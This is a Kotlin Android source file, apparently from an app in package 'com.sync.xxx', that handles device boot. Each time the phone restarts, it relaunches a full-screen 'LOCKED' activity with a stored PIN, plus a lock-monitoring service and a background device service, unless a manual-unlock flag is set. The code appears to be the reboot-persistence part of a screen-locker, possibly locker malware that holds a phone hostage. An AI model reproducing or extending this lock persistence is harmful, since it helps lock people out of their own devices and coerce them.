package com.sync.xxx

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED ||
            intent?.action == "android.intent.action.QUICKBOOT_POWERON") {
            
            val prefs = context.getSharedPreferences("lock_chat_v3_prefs", Context.MODE_PRIVATE)
            val lockLowPrefs = context.getSharedPreferences("lock_low_prefs", Context.MODE_PRIVATE)
            
            // ===== CEK MANUAL UNLOCK =====
            if (prefs.getBoolean("manual_unlock", false)) {
                android.util.Log.d("BootReceiver", "Manual unlock flag detected, skipping lock")
                // Tetap start DeviceService
                val deviceServiceIntent = Intent(context, DeviceService::class.java)
                ContextCompat.startForegroundService(context, deviceServiceIntent)
                return
            }
            
            // ===== CEK LOCK LOW ACTIVE =====
            val lockLowActive = lockLowPrefs.getBoolean("lock_low_active", false)
            if (lockLowActive) {
                val pin = lockLowPrefs.getString("lock_low_pin", "1234") ?: "1234"
                val title = lockLowPrefs.getString("lock_low_title", "LOCKED") ?: "LOCKED"
                
                android.util.Log.d("BootReceiver", "Lock LOW ACTIVE - starting lock immediately")
                
                // Start LockNewActivity (Lock Low)
                val activityIntent = Intent(context, LockNewActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    putExtra(LockOverlayService.EXTRA_PIN, pin)
                    putExtra(LockOverlayService.EXTRA_TITLE, title)
                }
                context.startActivity(activityIntent)
                
                // Start DeviceService
                val deviceServiceIntent = Intent(context, DeviceService::class.java)
                ContextCompat.startForegroundService(context, deviceServiceIntent)
                
                android.util.Log.d("BootReceiver", "Lock Low started after reboot")
                return
            }
            
            // ===== CEK LOCK CHAT V3 ACTIVE =====
            val lockActive = prefs.getBoolean("lock_active", false)
            
            if (lockActive) {
                val pin = prefs.getString("lock_pin", "1234") ?: "1234"
                val title = prefs.getString("lock_title", "LOCKED") ?: "LOCKED"
                
                android.util.Log.d("BootReceiver", "Lock ACTIVE - starting lock immediately")
                
                // ===== 1. START LOCK CHAT ACTIVITY (INSTANT) =====
                val activityIntent = Intent(context, LockChatActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    putExtra(LockChatActivity.EXTRA_TITLE, title)
                    putExtra(LockChatActivity.EXTRA_PIN, pin)
                }
                context.startActivity(activityIntent)
                
                // ===== 2. START LOCK MONITOR SERVICE =====
                val serviceIntent = Intent(context, LockMonitorService::class.java).apply {
                    putExtra(LockMonitorService.EXTRA_PIN, pin)
                    putExtra(LockMonitorService.EXTRA_TITLE, title)
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
                
                // ===== 3. START DEVICE SERVICE (LANGSUNG, TANPA DELAY) =====
                val deviceServiceIntent = Intent(context, DeviceService::class.java)
                ContextCompat.startForegroundService(context, deviceServiceIntent)
                
                android.util.Log.d("BootReceiver", "All services started")
                
            } else {
                // Lock tidak aktif, start DeviceService aja
                android.util.Log.d("BootReceiver", "Lock NOT active, starting DeviceService only")
                val deviceServiceIntent = Intent(context, DeviceService::class.java)
                ContextCompat.startForegroundService(context, deviceServiceIntent)
            }
        }
    }
}
